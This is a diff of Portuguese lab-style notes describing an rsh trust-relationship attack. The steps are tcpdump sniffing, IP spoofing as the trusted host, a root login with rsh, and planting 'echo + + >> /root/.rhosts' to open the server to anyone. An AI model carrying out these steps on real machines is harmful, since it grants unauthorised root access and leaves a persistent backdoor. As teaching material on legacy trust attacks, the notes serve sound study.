@@ -1,4 +1,4 @@
-atacker: para oberter enderecos do server e trusted, vamos usar tcpdump pra monitorar o trafego entre server e trusted
+atacker: para obter enderecos do server e trusted, vamos usar tcpdump pra monitorar o trafego entre server e trusted
 tcpdump -x -i eth0 arp
 
 
@@ -29,9 +29,23 @@ ver se alguma informação interessante trafega
 
 tcpdump -A -i eth0 host [ip de trusted]
 
-atacker: fazer rsh pra server
+attacker: com isso notamos que há comunicação rsh ocorrendo entre as duas maquinas, logo é possível que haja uma relação de confiança entre as duas
+então iremos nos personificar como uma das máquinas confiáveis e invadir o sistema alheio!
 
-continua...
+# dos em trusted???????????
+
+attacker: vamos spoofar nosso ip para trusted
+ifconfig eth0 [ip de trusted]
+
+attacker: agora somos vistos como trusted, então vamo invadir server
+rsh root@server
+
+attacker: agora que estamos dentro (e com privilegios), vamos escancarar a máquina pra qualquer um que deseje entrar rsrsrs
+echo + + >> /root/.rhosts
+
+attacker: com o acesso liberado, vamo sair da máquina
+exit
+
 
 # arp entry max age
 /proc/sys/net/ipv4/neigh/ethX/gc_stale_time
